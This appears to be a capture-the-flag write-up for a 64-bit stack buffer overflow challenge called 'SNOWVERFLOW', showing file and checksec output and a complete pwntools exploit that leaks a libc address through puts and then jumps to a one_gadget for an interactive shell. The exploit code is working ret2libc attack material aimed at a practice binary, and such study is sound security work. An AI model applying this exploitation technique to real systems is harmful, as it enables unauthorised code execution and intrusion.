# SNOWVERFLOW

file: `#x86_64` `#stripped`
vuln: `#bof`
soln: `#ret2libc`

* File
```sh
$ file chall 
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b96d5da6df4dc39b35bec7a8068b741d24999c3d, stripped
```

* checksec.sh
```sh
$ checksec.sh --file chall 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    Not an ELF file   No RPATH   No RUNPATH   chall

```

* exploit
```python
from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./chall"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break *0x401201
        continue
    ''')
else:
    p = process(binfile)

payload = b""
payload += b"A" * 18
payload += p64(0x401273)    # pop rdi ; ret  ;
payload += p64(0x404018)    # setvbuf@plt+0x2fb8
payload += p64(0x401030)    # puts@plt
payload += p64(0x401167)    # main

p.recvuntil("Helloooooo, do you like to build snowmen?\n")
p.sendline(payload)
p.recvuntil("\n")
puts_got = u64(p.recv(6).ljust(8, b"\x00"))
log.info("puts_got: 0x{:08x}".format(puts_got))

puts_off = 0x809c0
libc_base = puts_got - puts_off
log.info("libc_base: 0x{:08x}".format(libc_base))

one_shot = 0x4f322
one_gadget = libc_base + one_shot

payload2 = b""
payload2 += b"A" * 18
payload2 += p64(0x40101a)    # ret
payload2 += p64(one_gadget)

p.recvuntil("Helloooooo, do you like to build snowmen?\n")
p.sendline(payload2)

p.recvuntil("Mhmmm... Boring...")
p.interactive()

```
